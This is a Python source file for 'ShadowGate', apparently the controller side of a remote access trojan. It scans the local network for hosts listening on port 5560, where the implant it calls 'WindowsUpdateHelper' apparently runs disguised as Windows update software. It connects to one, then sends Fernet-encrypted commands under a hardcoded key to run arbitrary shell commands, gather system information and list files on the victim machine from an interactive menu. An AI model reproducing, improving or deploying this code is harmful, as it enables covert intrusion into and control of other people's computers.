#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket
import json
import struct
import threading
from cryptography.fernet import Fernet
from termcolor import colored
import pyfiglet
import netifaces
import time


class ShadowGateController:
    def __init__(self):
        self.target_ip = None
        self.socket = None
        self.connected = False

        # 🔑 CLAVE VÁLIDA Y PROBADA - 44 caracteres exactos
        self.encryption_key = 'EbFqsf2CJ6a8pRHtKiHe-V6R9uMXvPEO627-wzsx_k4='
        self.cipher = Fernet(self.encryption_key)

    def scan_network(self):
        """Escanear la red en busca de objetivos con WindowsUpdateHelper"""
        print(colored("🔍 Escaneando red en busca de objetivos...", 'yellow'))

        try:
            # Obtener red local
            gateway = netifaces.gateways()['default'][netifaces.AF_INET][0]
            network = '.'.join(gateway.split('.')[:3]) + '.'

            targets_found = []

            # Escanear en hilos para mayor velocidad
            def check_ip(ip):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((ip, 5560))
                    sock.close()

                    if result == 0:
                        targets_found.append(ip)
                        print(colored(f"   ✅ Objetivo encontrado: {ip}", 'green'))
                except:
                    pass

            # Crear hilos para escaneo
            threads = []
            for i in range(1, 255):
                ip = network + str(i)
                thread = threading.Thread(target=check_ip, args=(ip,))
                threads.append(thread)
                thread.start()

                # Limitar número de hilos simultáneos
                if len(threads) >= 50:
                    for t in threads:
                        t.join()
                    threads = []

            # Esperar hilos restantes
            for thread in threads:
                thread.join()

            return targets_found

        except Exception as e:
            print(colored(f"❌ Error escaneando red: {e}", 'red'))
            return []

    def auto_connect(self):
        """Conectar automáticamente al primer objetivo encontrado"""
        targets = self.scan_network()

        if not targets:
            print(colored("❌ No se encontraron objetivos en la red", 'red'))
            return False

        # Conectar al primer objetivo encontrado
        target_ip = targets[0]
        return self.connect(target_ip)

    def connect(self, target_ip):
        """Conectar al objetivo"""
        try:
            self.target_ip = target_ip
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(10)
            self.socket.connect((target_ip, 5560))
            self.connected = True
            print(colored(f"✅ Conectado a {target_ip}", 'green'))
            return True
        except Exception as e:
            print(colored(f"❌ Error conectando a {target_ip}: {e}", 'red'))
            return False

    def send_command(self, command_type, data=None):
        """Enviar comando cifrado"""
        if not self.connected:
            print(colored("❌ No conectado. Usa connect() primero.", 'red'))
            return None

        try:
            command = {
                'type': command_type,
                'data': data or {}
            }

            # Cifrar comando
            encrypted_cmd = self.cipher.encrypt(json.dumps(command).encode())

            # Enviar tamaño + datos
            self.socket.send(struct.pack('!I', len(encrypted_cmd)))
            self.socket.send(encrypted_cmd)

            # Recibir respuesta
            size_data = self.socket.recv(4)
            if not size_data:
                return None

            size = struct.unpack('!I', size_data)[0]
            response_data = b''

            while len(response_data) < size:
                chunk = self.socket.recv(min(4096, size - len(response_data)))
                if not chunk:
                    break
                response_data += chunk

            # Descifrar respuesta
            decrypted_response = self.cipher.decrypt(response_data)
            return json.loads(decrypted_response.decode())

        except Exception as e:
            print(colored(f"❌ Error enviando comando: {e}", 'red'))
            return None

    def execute_command(self, cmd):
        """Ejecutar comando en el objetivo"""
        return self.send_command('system_command', {'command': cmd})

    def get_system_info(self):
        """Obtener información del sistema"""
        return self.execute_command("systeminfo")

    def file_explorer(self, path="C:\\"):
        """Explorar archivos"""
        return self.execute_command(f"dir \"{path}\"")

    def show_banner(self):
        """Mostrar banner"""
        banner = pyfiglet.figlet_format("SHADOWGATE", font="slant")
        print(colored(banner, 'cyan'))
        print(colored("🕶️  Remote Control System", 'yellow'))
        print("=" * 60)

    def interactive_menu(self):
        """Menú interactivo mejorado con detección automática"""
        self.show_banner()

        while True:
            print("\n" + "=" * 50)
            print(colored("🎮 MENÚ DE CONTROL", 'magenta'))
            print("=" * 50)

            if self.target_ip:
                print(colored(f"✅ Conectado a: {self.target_ip}", 'green'))
            else:
                print(colored("❌ Sin conexión", 'yellow'))

            print("1. 🔍 Escanear y conectar automáticamente")
            print("2. 📡 Conectar a IP específica")
            print("3. 🖥️  Información del sistema")
            print("4. 📁 Explorar archivos")
            print("5. 🚪 Desconectar")
            print("6. 🔄 Re-escanear objetivos")
            print("0. 🏃 Salir")
            print("=" * 50)

            choice = input("👉 Selecciona opción: ").strip()

            if choice == "1":
                if self.auto_connect():
                    print(colored("🎯 Conexión automática exitosa!", 'green'))
                else:
                    print(colored("❌ No se pudo conectar automáticamente", 'red'))

            elif choice == "2":
                target = input("IP del objetivo: ").strip()
                if target:
                    self.connect(target)

            elif choice == "3" and self.connected:
                result = self.get_system_info()
                if result and result.get('success'):
                    print(colored("🖥️  System Info:", 'green'))
                    print(result.get('output', ''))
                else:
                    print(colored("❌ Error obteniendo información", 'red'))

            elif choice == "4" and self.connected:
                path = input("Ruta (ej: C:\\Users): ").strip() or "C:\\"
                result = self.file_explorer(path)
                if result and result.get('success'):
                    print(colored(f"📁 Contenido de {path}:", 'green'))
                    print(result.get('output', ''))
                else:
                    print(colored("❌ Error listando archivos", 'red'))

            elif choice == "5":
                if self.socket:
                    self.socket.close()
                self.connected = False
                self.target_ip = None
                print(colored("🔌 Desconectado", 'yellow'))

            elif choice == "6":
                targets = self.scan_network()
                if targets:
                    print(colored(f"🎯 Objetivos encontrados: {targets}", 'green'))
                else:
                    print(colored("❌ No se encontraron objetivos", 'red'))

            elif choice == "0":
                print(colored("👋 Saliendo...", 'blue'))
                break

            else:
                print(colored("❌ Opción no válida", 'red'))

            input("\n📍 Presiona Enter para continuar...")


# Función de prueba rápida
def test_connection():
    """Probar conexión automática"""
    controller = ShadowGateController()

    print(colored("🧪 Iniciando prueba automática...", 'yellow'))

    if controller.auto_connect():
        print("\n✅ Conexión automática exitosa!")

        # Probar comando simple
        print("🧪 Probando comando systeminfo...")
        info = controller.get_system_info()
        if info and info.get('success'):
            print("✅ Systeminfo funcionando correctamente")
            # Mostrar información básica del sistema
            lines = info.get('output', '').split('\n')
            for line in lines[:5]:  # Primeras 5 líneas
                if line.strip():
                    print(f"   {line}")
        else:
            print("❌ Error ejecutando systeminfo")

        controller.socket.close()
    else:
        print("❌ No se pudo conectar automáticamente")


if __name__ == "__main__":
    # Ejecutar menú interactivo
    controller = ShadowGateController()

    # Primero intentar conexión automática
    print(colored("🔄 Intentando conexión automática...", 'yellow'))
    if controller.auto_connect():
        print(colored("✅ Conectado automáticamente!", 'green'))
    else:
        print(colored("ℹ️  Usa el menú para conectar manualmente", 'yellow'))

    controller.interactive_menu()